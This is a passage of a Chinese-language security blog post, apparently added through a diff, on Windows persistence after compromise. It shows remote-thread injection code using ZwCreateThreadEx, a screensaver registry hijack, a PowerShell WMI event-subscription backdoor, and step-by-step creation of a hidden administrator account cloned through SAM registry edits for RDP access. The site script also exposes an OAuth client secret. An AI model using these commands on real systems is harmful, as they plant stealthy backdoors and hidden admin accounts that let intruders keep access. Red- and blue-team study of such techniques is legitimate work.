dw1,</span></span><br><span class="hljs-params"><span class="hljs-function">        DWORD dw2,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPVOID pUnkown</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> </span><br>    typedef_ZwCreateThreadEx ZwCreateThreadEx = <span class="hljs-literal">NULL</span>;<br>    ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::<span class="hljs-built_in">GetProcAddress</span>(hNtdll, <span class="hljs-string">&quot;ZwCreateThreadEx&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (ZwCreateThreadEx == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Get ZwCreateThreadEx Address Error,Error is:%d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Get ZwCreateThreadEx Address Successfully! Address is %x\n&quot;</span>, ZwCreateThreadEx);<br>    &#125;<br>    HANDLE hRemoteThread = <span class="hljs-literal">NULL</span>;<br>    DWORD ZwRet = <span class="hljs-number">0</span>;<br>    ZwRet = <span class="hljs-built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="hljs-literal">NULL</span>, hHandle,<br>        (LPTHREAD_START_ROUTINE)Memory, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (hRemoteThread == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Creat RemoteThread Error,Error is:%d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-built_in">getchar</span>();<br>        <span class="hljs-built_in">VirtualFreeEx</span>(hHandle, Memory, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        <span class="hljs-built_in">CloseHandle</span>(hHandle);<br>        <span class="hljs-built_in">FreeLibrary</span>(hNtdll);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-built_in">WaitForSingleObject</span>(hRemoteThread, INFINITE);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="0x11-屏幕保护程序"><a href="#0x11-屏幕保护程序" class="headerlink" title="0x11 屏幕保护程序"></a>0x11 屏幕保护程序</h1><p><strong>利用前提:对方开启了屏幕保护</strong></p>
+<p>屏幕保护程序，当初的设计是为了防止长期屏幕的显示，预防老化与缩短屏幕显示器老化的一种保护程序。</p>
+<p>在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的，攻击者可以利用屏幕保护程序来隐藏shell,达到一定的权限维持。</p>
+<p>注册表位置:</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">HKEY_CURRENT_USER<span class="hljs-string">\Control</span> Panel<span class="hljs-string">\Desktop</span><br></code></pre></td></tr></table></figure>
+
+<p>命令行修改:</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\C</span>ontrol Panel<span class="hljs-symbol">\D</span>esktop&quot; /v SCRNSAVE.EXE /d C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\c</span>md.exe<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/25.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/26.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里可以改成我们的马,达到维持权限的效果,具体时间为注册表的ScreenSaverTimeout值有关</p>
+<h1 id="0x12-WMI构造无文件后门"><a href="#0x12-WMI构造无文件后门" class="headerlink" title="0x12 WMI构造无文件后门"></a>0x12 WMI构造无文件后门</h1><p>WMI是一项Windows管理技术，其全称是Windows Management Instrumentation，即Windows管理规范。大多数基于Windows的软件依赖于此服务。</p>
+<p>无文件无进程使得他非常隐蔽成为后门，但由于他的隐蔽性现在被大多数杀软所查杀。</p>
+<p>通过与Powershell命令配合使用可以实现无文件，具有良好的隐蔽性也是目前较为常用的持久化手段。</p>
+<p>如果展开讲会讲很久，这里推荐一篇比较详细的文章:<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/WMI%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html">https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$filterName</span> = <span class="hljs-string">&#x27;SD&#x27;</span><br><span class="hljs-variable">$consumerName</span> = <span class="hljs-string">&#x27;SDD&#x27;</span><br><span class="hljs-variable">$exePath</span> = <span class="hljs-string">&#x27;C:\Windows\System32\cmd.exe&#x27;</span><br><span class="hljs-variable">$Query</span> = <span class="hljs-string">&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;=200 AND TargetInstance.SystemUpTime &lt; 320&quot;</span><br><span class="hljs-variable">$WMIEventFilter</span> = <span class="hljs-built_in">Set-WmiInstance</span> <span class="hljs-literal">-Class</span> __EventFilter <span class="hljs-literal">-NameSpace</span> <span class="hljs-string">&quot;root\subscription&quot;</span> <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;Name=<span class="hljs-variable">$filterName</span>;EventNameSpace=<span class="hljs-string">&quot;root\cimv2&quot;</span>;QueryLanguage=<span class="hljs-string">&quot;WQL&quot;</span>;Query=<span class="hljs-variable">$Query</span>&#125; <span class="hljs-literal">-ErrorAction</span> Stop<br><span class="hljs-variable">$WMIEventConsumer</span> = <span class="hljs-built_in">Set-WmiInstance</span> <span class="hljs-literal">-Class</span> CommandLineEventConsumer <span class="hljs-literal">-Namespace</span> <span class="hljs-string">&quot;root\subscription&quot;</span> <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;Name=<span class="hljs-variable">$consumerName</span>;ExecutablePath=<span class="hljs-variable">$exePath</span>;CommandLineTemplate=<span class="hljs-variable">$exePath</span>&#125;<br><span class="hljs-built_in">Set-WmiInstance</span> <span class="hljs-literal">-Class</span> __FilterToConsumerBinding <span class="hljs-literal">-Namespace</span> <span class="hljs-string">&quot;root\subscription&quot;</span> <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-keyword">Filter</span>=<span class="hljs-variable">$WMIEventFilter</span>;Consumer=<span class="hljs-variable">$WMIEventConsumer</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以使用Autoruns进行查看</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/27.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="0x13-影子用户"><a href="#0x13-影子用户" class="headerlink" title="0x13 影子用户"></a>0x13 影子用户</h1><p>影子用户即创建的隐藏用户，它无法通过普通命令进行查询，比较隐蔽。</p>
+<p>这里以win10作为演示</p>
+<p>们先利用命令创建一个隐藏用户,并将其加入本地管理员组。</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> user <span class="hljs-keyword">test</span>$ 123456 /add<br><span class="hljs-keyword">net</span> localgroup administrators <span class="hljs-keyword">test</span>$ /add<br></code></pre></td></tr></table></figure>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/28.png" srcset="/img/loading.gif" lazyload></p>
+<p> net user无法查看</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/29.png" srcset="/img/loading.gif" lazyload></p>
+<p> 但是可以在计算机管理和登陆页面中看到</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/30.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/31.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法:"></a>解决办法:</h2><p>打开注册表:</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>AM<span class="hljs-symbol">\S</span>AM<br></code></pre></td></tr></table></figure>
+
+<p>修改权限:<br><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/32.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/33.png" srcset="/img/loading.gif" lazyload></p>
+<p> 修改完权限之后，我们重新启动注册表即可继续查看内容。</p>
+<h3 id="查看F值"><a href="#查看F值" class="headerlink" title="查看F值"></a>查看F值</h3><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/34.png" srcset="/img/loading.gif" lazyload></p>
+<p> 导出这三个值</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/35.png" srcset="/img/loading.gif" lazyload></p>
+<p>test$导出为<code>1.reg</code><br>000003EC包含<code>test$</code>用户的F值，导出另存为<code>2.reg</code><br>000003E9包含<code>WIN10</code>用户的F值，导出另存为<code>3.reg</code></p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/36.png" srcset="/img/loading.gif" lazyload></p>
+<p>将2.reg中的F值替换为3.reg中的F值，即将test$用户的F值替换为WIN10用户的F值</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/37.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="删除test"><a href="#删除test" class="headerlink" title="删除test$"></a>删除test$</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span>$ /del<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/38.png" srcset="/img/loading.gif" lazyload></p>
+<p>注册表就已经无法打开了<br><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/39.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="导入注册表"><a href="#导入注册表" class="headerlink" title="导入注册表"></a>导入注册表</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">regedit</span> /s <span class="hljs-number">1</span>.reg<br><span class="hljs-attribute">regedit</span> /s <span class="hljs-number">2</span>.reg<br></code></pre></td></tr></table></figure>
+
+<h3 id="查看效果"><a href="#查看效果" class="headerlink" title="查看效果"></a>查看效果</h3><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/40.png" srcset="/img/loading.gif" lazyload></p>
+<p> 但登录界面已经没有账户</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/41.png" srcset="/img/loading.gif" lazyload></p>
+<p> 3389直接登录,以test$账号登录</p>
+<p>但是登陆之后的身份却是原来WIN10用户，桌面也是原用户的，达到克隆效果。</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/42.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一边复现一边写,发现很多都需要权限，或者说如果有更高的权限能做的事更加的多,包括很多操作现在已经被各种终端设备监控,所以维权实际上是建立在免杀和提权之后的。我总结的可能不太全面,欢迎补充。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://hackergu.com/power-shadowuser/">https://hackergu.com/power-shadowuser/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/229209.html">https://www.freebuf.com/articles/system/229209.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/165235.html">https://www.freebuf.com/column/165235.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/102081047">https://zhuanlan.zhihu.com/p/102081047</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处，表明作者SD！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/09/01/%E4%BB%8E0%E5%AD%A6%E4%B9%A0URLDNS/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">从0学习DNSURL利用链</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/30/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">
+                        <span class="hidden-mobile">域渗透之域控权限维持</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"d3fed93d8ca9dd026b6a","clientSecret":"b3ebb466a8206df623c10df13110073b40137bdb","repo":"SD-XD.github.io","owner":"SD-XD","admin":["SD-XD"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":true,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'cd147d5ec2caba08f2963e0345fd8c42'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
